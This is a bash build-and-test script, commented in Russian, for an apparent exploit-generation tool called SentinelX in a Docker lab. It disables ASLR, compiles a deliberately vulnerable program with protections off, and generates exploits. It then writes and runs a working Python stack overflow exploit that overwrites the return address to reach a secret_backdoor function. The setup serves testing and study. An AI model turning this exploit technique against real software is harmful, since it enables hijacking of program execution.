#!/bin/bash
# Скрипт для сборки и тестирования в Docker окружении

set -e  # Выход при ошибке

echo "════════════════════════════════════════════════════════════"
echo "  SentinelX Docker Build & Test Script"
echo "════════════════════════════════════════════════════════════"
echo ""

# Цвета для вывода
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# 1. Отключаем ASLR (требует privileged контейнер)
echo "[*] Step 1: Disabling ASLR..."
if [ -w /proc/sys/kernel/randomize_va_space ]; then
    echo 0 > /proc/sys/kernel/randomize_va_space
    echo -e "${GREEN}[+] ASLR disabled${NC}"
else
    echo -e "${YELLOW}[!] Cannot disable ASLR (not privileged mode)${NC}"
    echo "[!] Exploits may not work due to ASLR"
fi
echo ""

# 2. Собираем уязвимую программу
echo "[*] Step 2: Compiling vulnerable programs..."
cd /sentinelx/docker

# x86_64 версия
echo "[*] Compiling for x86_64..."
gcc -m64 -fno-stack-protector -z execstack -no-pie \
    -Wno-deprecated-declarations \
    vuln_program.c -o vuln64 2>&1 | grep -v "warning:" || true

if [ -f vuln64 ]; then
    echo -e "${GREEN}[+] vuln64 compiled successfully${NC}"
    chmod +x vuln64
else
    echo -e "${RED}[-] Failed to compile vuln64${NC}"
    exit 1
fi

# x86 версия (если поддерживается)
echo "[*] Compiling for x86 (32-bit)..."
if gcc -m32 -fno-stack-protector -z execstack -no-pie \
    -Wno-deprecated-declarations \
    vuln_program.c -o vuln32 2>/dev/null; then
    echo -e "${GREEN}[+] vuln32 compiled successfully${NC}"
    chmod +x vuln32
else
    echo -e "${YELLOW}[!] Cannot compile 32-bit version (multilib not installed)${NC}"
fi
echo ""

# 3. Проверяем защиты
echo "[*] Step 3: Checking binary protections..."
echo ""
echo "=== vuln64 (x86_64) ==="
file vuln64
echo ""
echo "Checking for security features:"
readelf -l vuln64 | grep -i "gnu_stack" || echo "No GNU_STACK found"
readelf -h vuln64 | grep -i "type" || true
echo ""

# 4. Собираем SentinelX
echo "[*] Step 4: Building SentinelX..."
cd /sentinelx

if [ -f build.sh ]; then
    chmod +x build.sh
    echo "[*] Running build script..."
    ./build.sh 2>&1 | tail -20
else
    echo "[*] Building with CMake..."
    mkdir -p build
    cd build
    cmake .. -DSENTINELX_USE_LIEF=ON
    make -j$(nproc)
fi

if [ -f build/SentinelX ]; then
    echo -e "${GREEN}[+] SentinelX built successfully${NC}"
else
    echo -e "${RED}[-] SentinelX build failed${NC}"
    exit 1
fi
echo ""

# 5. Анализируем уязвимую программу
echo "[*] Step 5: Analyzing vulnerable binary with SentinelX..."
echo ""
./build/SentinelX --binary docker/vuln64 | head -60
echo ""

# 6. Генерируем эксплойты
echo "[*] Step 6: Generating exploits..."
echo ""
rm -rf docker/exploits_x64
./build/SentinelX --binary docker/vuln64 \
    --generate-exploits \
    --exploit-format both \
    --exploit-output docker/exploits_x64

if [ -d docker/exploits_x64 ]; then
    echo -e "${GREEN}[+] Exploits generated${NC}"
    echo "[*] Generated files:"
    ls -lh docker/exploits_x64/
else
    echo -e "${RED}[-] Exploit generation failed${NC}"
fi
echo ""

# 7. Тестируем нормальную работу
echo "[*] Step 7: Testing normal operation..."
echo ""
echo "Test 1: Valid user (admin)"
echo "admin" | ./docker/vuln64
echo ""

# 8. Тестируем переполнение
echo "[*] Step 8: Testing buffer overflow..."
echo ""
echo "Test 2: Buffer overflow (100 A's)"
python3 -c "print('A'*100)" | ./docker/vuln64 || echo "Program crashed (expected)"
echo ""

# 9. Создаем тестовый эксплойт
echo "[*] Step 9: Creating test exploit..."
cat > /sentinelx/docker/test_exploit.py << 'EXPLOIT_EOF'
#!/usr/bin/env python3
"""
Тест эксплойта для vuln64 в Docker
Демонстрация полного контроля над выполнением
"""

import struct
import subprocess
import sys

BINARY = "./docker/vuln64"

# Адрес функции secret_backdoor (нужно получить из nm)
# nm vuln64 | grep secret_backdoor
BACKDOOR_ADDR = 0x0  # Заполняется динамически

def get_backdoor_address():
    """Получаем адрес secret_backdoor из бинарника"""
    result = subprocess.run(
        ['nm', BINARY],
        capture_output=True,
        text=True
    )

    for line in result.stdout.split('\n'):
        if 'secret_backdoor' in line:
            addr = int(line.split()[0], 16)
            print(f"[+] Found secret_backdoor at: 0x{addr:x}")
            return addr

    print("[-] Could not find secret_backdoor address")
    return None

def create_payload(backdoor_addr):
    """Создаем payload для перезаписи return address"""

    # Структура стека для x86_64:
    # username[64] + saved RBP (8) + return address (8)

    payload = b""

    # Заполняем буфер username (64 байта)
    payload += b"A" * 64

    # Saved RBP (8 байт) - можно заполнить чем угодно
    payload += b"B" * 8

    # Return address (8 байт) - адрес secret_backdoor
    payload += struct.pack("<Q", backdoor_addr)

    return payload

def main():
    print("="*60)
    print("  SentinelX - Buffer Overflow Exploit Test (x86_64)")
    print("="*60)
    print()

    # Получаем адрес функции
    backdoor_addr = get_backdoor_address()
    if not backdoor_addr:
        print("[!] Cannot proceed without backdoor address")
        return

    # Создаем payload
    payload = create_payload(backdoor_addr)
    print(f"[*] Payload length: {len(payload)} bytes")
    print(f"[*] Payload structure:")
    print(f"    - Buffer fill: 64 bytes (A's)")
    print(f"    - Saved RBP: 8 bytes (B's)")
    print(f"    - Return addr: 8 bytes (0x{backdoor_addr:x})")
    print()

    # Запускаем эксплойт
    print("[*] Launching exploit...")
    print("[*] Sending payload to stdin...")
    print()

    try:
        proc = subprocess.Popen(
            [BINARY],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=False
        )

        stdout, stderr = proc.communicate(input=payload, timeout=2)

        print(stdout.decode('utf-8', errors='ignore'))

        if "SECRET BACKDOOR ACTIVATED" in stdout.decode('utf-8', errors='ignore'):
            print()
            print("="*60)
            print("  ✓ EXPLOIT SUCCESSFUL!")
            print("="*60)
            print("[+] Successfully redirected execution to secret_backdoor()")
            print("[+] Gained control over program flow")
        else:
            print()
            print("[!] Exploit did not trigger backdoor")

    except subprocess.TimeoutExpired:
        print("[!] Program hung or waiting for input")
        proc.kill()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
EXPLOIT_EOF

chmod +x /sentinelx/docker/test_exploit.py
python3 /sentinelx/docker/test_exploit.py
echo ""

echo "════════════════════════════════════════════════════════════"
echo -e "${GREEN}  Build and Test Complete!${NC}"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Next steps:"
echo "  1. Review generated exploits in docker/exploits_x64/"
echo "  2. Run: python3 docker/test_exploit.py"
echo "  3. Try manual exploitation with gdb"
echo ""
echo "Useful commands:"
echo "  gdb docker/vuln64"
echo "  nm docker/vuln64 | grep secret"
echo "  python3 -c 'print(\"A\"*80)' | ./docker/vuln64"
echo ""
